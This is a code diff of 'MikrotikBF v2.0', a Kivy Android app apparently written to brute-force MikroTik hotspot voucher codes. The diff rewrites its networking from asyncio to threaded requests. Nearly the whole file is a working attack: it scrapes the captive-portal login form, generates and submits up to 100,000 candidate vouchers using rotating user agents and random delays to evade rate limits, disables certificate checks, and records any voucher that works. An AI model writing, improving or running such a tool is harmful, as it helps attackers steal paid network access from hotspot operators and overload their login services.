@@ -2,17 +2,16 @@
 # -*- coding: utf-8 -*-
 """
 MikrotikBF v2.0 — Android Edition
-Developer: Hussein
+Uses requests + threading (Android-compatible)
 """
 
-import asyncio
-import threading
-import random
-import time
-import contextlib
-import sqlite3
 import os
 import sys
+import time
+import random
+import threading
+import sqlite3
+import queue
 from datetime import datetime
 from urllib.parse import urljoin
 
@@ -26,12 +25,8 @@ from kivy.uix.textinput import TextInput
 from kivy.core.window import Window
 from kivy.utils import platform
 
-try:
-    import aiohttp
-    from bs4 import BeautifulSoup
-    HAS_DEPS = True
-except ImportError:
-    HAS_DEPS = False
+import requests
+from bs4 import BeautifulSoup
 
 # ═══════════════════════════════════════════════════════════
 #  الإعدادات
@@ -42,7 +37,7 @@ DEFAULT_SUFFIX = "2"
 DEFAULT_VAR_DIGITS = 5
 DEFAULT_MAX_ATTEMPTS = 100000
 
-MAX_CONCURRENT = 3
+MAX_THREADS = 3
 REQUEST_TIMEOUT = 15
 RETRY_ATTEMPTS = 2
 DELAY_MIN = 0.3
@@ -60,8 +55,11 @@ SUCCESS_KEYWORDS = ["status", "success", "welcome", "logged in", "valid", "you a
 FAILURE_KEYWORDS = ["login", "error", "failed", "invalid", "incorrect", "wrong"]
 
 if platform == 'android':
-    from android.storage import primary_external_storage_path
-    APP_DIR = os.path.join(primary_external_storage_path(), 'MikrotikBF')
+    try:
+        from android.storage import primary_external_storage_path
+        APP_DIR = os.path.join(primary_external_storage_path(), 'MikrotikBF')
+    except Exception:
+        APP_DIR = '/sdcard/MikrotikBF'
 else:
     APP_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -71,23 +69,23 @@ DB_FILE = os.path.join(APP_DIR, "history.db")
 
 
 class LogWriter:
-    """Redirect print output to Kivy log area."""
     def __init__(self, callback):
         self.callback = callback
     def write(self, text):
         if text and text.strip():
-            Clock.schedule_once(lambda dt: self.callback(text), 0)
+            try:
+                Clock.schedule_once(lambda dt: self.callback(text), 0)
+            except Exception:
+                pass
     def flush(self):
         pass
 
 
-# ═══════════════════════════════════════════════════════════
-#  قاعدة البيانات
-# ═══════════════════════════════════════════════════════════
 class Database:
     def __init__(self, db_path=DB_FILE):
-        self.conn = sqlite3.connect(db_path)
+        self.conn = sqlite3.connect(db_path, check_same_thread=False)
         self.cursor = self.conn.cursor()
+        self.lock = threading.Lock()
         self.cursor.execute("""
             CREATE TABLE IF NOT EXISTS attempted (
                 number TEXT PRIMARY KEY,
@@ -97,27 +95,30 @@ class Database:
         self.conn.commit()
 
     def add(self, voucher):
+        with self.lock:
+            try:
+                self.cursor.execute("INSERT OR IGNORE INTO attempted (number) VALUES (?)", (voucher,))
+                self.conn.commit()
+            except Exception:
+                pass
+
+    def exists(self, voucher):
+        with self.lock:
+            self.cursor.execute("SELECT 1 FROM attempted WHERE number = ?", (voucher,))
+            return self.cursor.fetchone() is not None
+
+    def count_attempted(self):
+        with self.lock:
+            self.cursor.execute("SELECT COUNT(*) FROM attempted")
+            return self.cursor.fetchone()[0]
+
+    def close(self):
         try:
-            self.cursor.execute("INSERT OR IGNORE INTO attempted (number) VALUES (?)", (voucher,))
-            self.conn.commit()
+            self.conn.close()
         except Exception:
             pass
 
-    def exists(self, voucher):
-        self.cursor.execute("SELECT 1 FROM attempted WHERE number = ?", (voucher,))
-        return self.cursor.fetchone() is not None
 
-    def count_attempted(self):
-        self.cursor.execute("SELECT COUNT(*) FROM attempted")
-        return self.cursor.fetchone()[0]
-
-    def close(self):
-        self.conn.close()
-
-
-# ═══════════════════════════════════════════════════════════
-#  الأداة الرئيسية
-# ═══════════════════════════════════════════════════════════
 class HusseinNetTool:
     def __init__(self, start_url, prefix, suffix, var_digits, max_attempts, log_cb):
         self.start_url = start_url.rstrip('/')
@@ -134,56 +135,57 @@ class HusseinNetTool:
         self.total_attempts = self.db.count_attempted()
         self.error_count = 0
         self.start_time = None
-        self.stop_event = asyncio.Event()
+        self.stop_event = threading.Event()
         self.found_voucher = None
         self.current_voucher = None
 
-        self.queue = asyncio.Queue(maxsize=MAX_CONCURRENT * 3)
+        self.queue = queue.Queue(maxsize=MAX_THREADS * 3)
         self.workers = []
 
-    async def init_session(self):
-        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2)
-        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
-        self.session = aiohttp.ClientSession(
-            connector=connector,
-            timeout=timeout,
-            cookie_jar=aiohttp.CookieJar()
-        )
-
-    async def close_session(self):
-        if self.session:
-            await self.session.close()
-        self.db.close()
-
-    def get_random_headers(self):
-        return {
-            "User-Agent": random.choice(USER_AGENTS),
+    def init_session(self):
+        self.session = requests.Session()
+        self.session.headers.update({
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
             "Connection": "keep-alive",
-        }
+        })
 
-    async def fetch_with_retry(self, method, url, **kwargs):
+    def close_session(self):
+        if self.session:
+            try:
+                self.session.close()
+            except Exception:
+                pass
+        self.db.close()
+
+    def get_random_headers(self):
+        return {"User-Agent": random.choice(USER_AGENTS)}
+
+    def fetch_with_retry(self, method, url, **kwargs):
         for attempt in range(RETRY_ATTEMPTS):
             try:
                 headers = self.get_random_headers()
                 if 'headers' in kwargs:
                     headers.update(kwargs.pop('headers'))
-                async with self.session.request(method, url, ssl=False,
-                                                headers=headers, **kwargs) as resp:
-                    if resp.status >= 400:
-                        raise Exception(f"HTTP {resp.status}")
-                    body = await resp.text()
-                    return resp, body
+                r = self.session.request(
+                    method, url,
+                    headers=headers,
+                    timeout=REQUEST_TIMEOUT,
+                    verify=False,
+                    **kwargs
+                )
+                if r.status_code >= 400:
+                    raise Exception(f"HTTP {r.status_code}")
+                return r, r.text
             except Exception:
                 if attempt == RETRY_ATTEMPTS - 1:
                     raise
-                await asyncio.sleep(1)
+                time.sleep(1)
 
-    async def extract_login_details(self):
+    def extract_login_details(self):
         try:
             self.log(f"[*] تحميل: {self.start_url}\n")
-            resp, html = await self.fetch_with_retry('GET', self.start_url)
+            resp, html = self.fetch_with_retry('GET', self.start_url)
         except Exception as e:
             self.log(f"[-] فشل: {e}\n")
             return False
@@ -203,7 +205,7 @@ class HusseinNetTool:
                 login_url = login_links[0]
                 self.log(f"[*] رابط login: {login_url}\n")
                 try:
-                    resp2, html2 = await self.fetch_with_retry('GET', login_url)
+                    resp2, html2 = self.fetch_with_retry('GET', login_url)
                     soup2 = BeautifulSoup(html2, 'html.parser')
                     form = soup2.find('form')
                     if form:
@@ -219,18 +221,16 @@ class HusseinNetTool:
                     self.log(f"[-] فشل: {e}\n")
             else:
                 self.log("[-] لا يوجد رابط login\n")
+            return False
 
-        if form:
-            action = form.get('action', '')
-            self.login_url = urljoin(self.start_url, action) if action else self.start_url
-            for inp in form.find_all('input'):
-                name = inp.get('name')
-                if name:
-                    self.form_data_template[name] = inp.get('value', '')
-            self.log(f"[+] POST URL: {self.login_url}\n")
-            return True
-
-        return False
+        action = form.get('action', '')
+        self.login_url = urljoin(self.start_url, action) if action else self.start_url
+        for inp in form.find_all('input'):
+            name = inp.get('name')
+            if name:
+                self.form_data_template[name] = inp.get('value', '')
+        self.log(f"[+] POST URL: {self.login_url}\n")
+        return True
 
     def generate_voucher(self):
         max_val = 10 ** self.var_digits - 1
@@ -251,41 +251,50 @@ class HusseinNetTool:
                 return voucher
         return None
 
-    async def producer(self):
+    def producer(self):
         attempts = 0
         while attempts < self.max_attempts and not self.stop_event.is_set():
             voucher = self.generate_voucher()
             if voucher is None:
                 self.log("[!] استنفاد الكروت\n")
                 break
-            await self.queue.put(voucher)
+            try:
+                self.queue.put(voucher, timeout=1)
+            except queue.Full:
+                continue
             attempts += 1
-        await self.queue.put(None)
-
-    async def worker(self, worker_id):
         try:
-            await self.fetch_with_retry('GET', self.start_url)
+            self.queue.put(None, timeout=2)
+        except queue.Full:
+            pass
+
+    def worker(self, worker_id):
+        try:
+            self.fetch_with_retry('GET', self.start_url)
         except Exception:
             pass
 
         while not self.stop_event.is_set():
             try:
-                voucher = await asyncio.wait_for(self.queue.get(), timeout=0.5)
-            except asyncio.TimeoutError:
+                voucher = self.queue.get(timeout=0.5)
+            except queue.Empty:
                 continue
             if voucher is None:
-                self.queue.task_done()
+                try:
+                    self.queue.task_done()
+                except Exception:
+                    pass
                 break
 
             self.current_voucher = voucher
-            await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
+            time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
 
             self.total_attempts += 1
             if self.total_attempts % BATCH_SIZE == 0:
-                await asyncio.sleep(BATCH_REST)
+                time.sleep(BATCH_REST)
 
             try:
-                await self.fetch_with_retry('GET', self.start_url)
+                self.fetch_with_retry('GET', self.start_url)
             except Exception:
                 pass
 
@@ -305,7 +314,7 @@ class HusseinNetTool:
                     data[key] = '1234'
 
             try:
-                resp, body = await self.fetch_with_retry(
+                resp, body = self.fetch_with_retry(
                     'POST', self.login_url, data=data, allow_redirects=True
                 )
                 final_url = str(resp.url).lower()
@@ -327,12 +336,6 @@ class HusseinNetTool:
                     self.save_valid_voucher(voucher, final_url)
                     self.log(f"\n✅✅✅ كرت صحيح: {voucher}\n")
                     self.stop_event.set()
-                    while not self.queue.empty():
-                        try:
-                            self.queue.get_nowait()
-                            self.queue.task_done()
-                        except Exception:
-                            pass
                 else:
                     if self.total_attempts % 100 == 0:
                         self.log(f"[فشل] {voucher}\n")
@@ -341,13 +344,19 @@ class HusseinNetTool:
                 if self.total_attempts % 50 == 0:
                     self.log(f"[خطأ] {voucher} - {str(e)[:30]}\n")
 
-            self.queue.task_done()
+            try:
+                self.queue.task_done()
+            except Exception:
+                pass
 
     def save_valid_voucher(self, voucher, final_url):
-        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
-            f.write(f"[{datetime.now()}] Voucher: {voucher} | URL: {final_url}\n")
+        try:
+            with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] Voucher: {voucher} | URL: {final_url}\n")
+        except Exception:
+            pass
 
-    async def ui_reporter(self):
+    def ui_reporter(self):
         while not self.stop_event.is_set():
             elapsed = time.time() - self.start_time if self.start_time else 0
             rate = self.total_attempts / elapsed if elapsed > 0 else 0
@@ -356,44 +365,41 @@ class HusseinNetTool:
                       f"❌ {self.error_count} | "
                       f"🎫 {self.current_voucher or '---'}")
             self.log(f"\r{status}")
-            await asyncio.sleep(1.0)
+            time.sleep(1.0)
 
-    async def shutdown(self):
+    def shutdown(self):
         self.stop_event.set()
-        for t in self.workers:
-            if not t.done():
-                t.cancel()
-        with contextlib.suppress(asyncio.CancelledError):
-            await asyncio.gather(*self.workers, return_exceptions=True)
-        await self.close_session()
 
-    async def run(self):
+    def run(self):
         self.log(f"[*] الصفحة: {self.start_url}\n")
-        await self.init_session()
+        self.init_session()
 
-        if not await self.extract_login_details():
+        if not self.extract_login_details():
             self.log("[-] فشل استخراج رابط الدخول\n")
-            await self.close_session()
+            self.close_session()
             return
 
         self.log(f"[+] بدء الاختبار ({self.max_attempts} محاولة)\n")
         self.start_time = time.time()
-        producer_task = asyncio.create_task(self.producer())
-        ui_task = asyncio.create_task(self.ui_reporter())
-        self.workers = [asyncio.create_task(self.worker(i)) for i in range(MAX_CONCURRENT)]
+
+        producer_thread = threading.Thread(target=self.producer, daemon=True)
+        ui_thread = threading.Thread(target=self.ui_reporter, daemon=True)
+        self.workers = [threading.Thread(target=self.worker, args=(i,), daemon=True)
+                        for i in range(MAX_THREADS)]
+
+        producer_thread.start()
+        ui_thread.start()
+        for t in self.workers:
+            t.start()
 
         try:
-            await self.stop_event.wait()
+            while not self.stop_event.is_set():
+                time.sleep(0.5)
         except KeyboardInterrupt:
             self.log("\nتم الإيقاف يدوياً\n")
         finally:
-            await self.shutdown()
-            for task in [producer_task, ui_task] + self.workers:
-                if not task.done():
-                    task.cancel()
-            with contextlib.suppress(asyncio.CancelledError):
-                await asyncio.gather(producer_task, ui_task, *self.workers,
-                                     return_exceptions=True)
+            self.shutdown()
+            self.close_session()
 
         if self.found_voucher:
             self.log(f"\n✅ النتيجة: {self.found_voucher}\n")
@@ -401,9 +407,6 @@ class HusseinNetTool:
             self.log(f"\n⚠️ تم اختبار {self.total_attempts} كرت\n")
 
 
-# ═══════════════════════════════════════════════════════════
-#  واجهة Kivy
-# ═══════════════════════════════════════════════════════════
 class MikrotikBFApp(App):
     def build(self):
         self.title = 'MikrotikBF v2.0'
@@ -411,14 +414,12 @@ class MikrotikBFApp(App):
 
         root = BoxLayout(orientation='vertical', padding=10, spacing=8)
 
-        # Header
         header = Label(
             text='[b][color=a855f7]MikrotikBF v2.0[/color][/b]\n[color=8b95a9]Developer: Hussein[/color]',
             markup=True, size_hint_y=None, height=60, font_size='18sp'
         )
         root.add_widget(header)
 
-        # Inputs
         def make_input(label, default):
             box = BoxLayout(orientation='horizontal', size_hint_y=None, height=44, spacing=8)
             lbl = Label(text=label, size_hint_x=0.35, color=(0.78, 0.84, 0.9, 1))
@@ -437,7 +438,6 @@ class MikrotikBFApp(App):
         self.digits_inp = make_input('Digits', str(DEFAULT_VAR_DIGITS))
         self.attempts_inp = make_input('المحاولات', str(DEFAULT_MAX_ATTEMPTS))
 
-        # Buttons
         btn_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=8)
         self.start_btn = Button(
             text='▶ ابدأ',
@@ -455,7 +455,6 @@ class MikrotikBFApp(App):
         btn_box.add_widget(self.stop_btn)
         root.add_widget(btn_box)
 
-        # Log
         log_label = Label(text='السجل:', size_hint_y=None, height=24,
                           color=(0.78, 0.84, 0.9, 1))
         root.add_widget(log_label)
@@ -470,7 +469,6 @@ class MikrotikBFApp(App):
         scroll.add_widget(self.log_input)
         root.add_widget(scroll)
 
-        # Redirect print
         sys.stdout = LogWriter(self.append_log)
 
         return root
@@ -480,10 +478,6 @@ class MikrotikBFApp(App):
         self.log_input.cursor = (0, len(self.log_input.text.split('\n')[-1]))
 
     def start_attack(self, instance):
-        if not HAS_DEPS:
-            self.append_log('❌ مكتبات ناقصة\n')
-            return
-
         try:
             url = self.url_inp.text.strip()
             prefix = self.prefix_inp.text.strip()
@@ -501,7 +495,7 @@ class MikrotikBFApp(App):
 
         def run_loop():
             try:
-                asyncio.run(self.tool.run())
+                self.tool.run()
             except Exception as e:
                 self.append_log(f'\n❌ خطأ: {e}\n')
             finally:
@@ -522,4 +516,5 @@ class MikrotikBFApp(App):
 
 
 if __name__ == '__main__':
+    requests.packages.urllib3.disable_warnings()
     MikrotikBFApp().run()
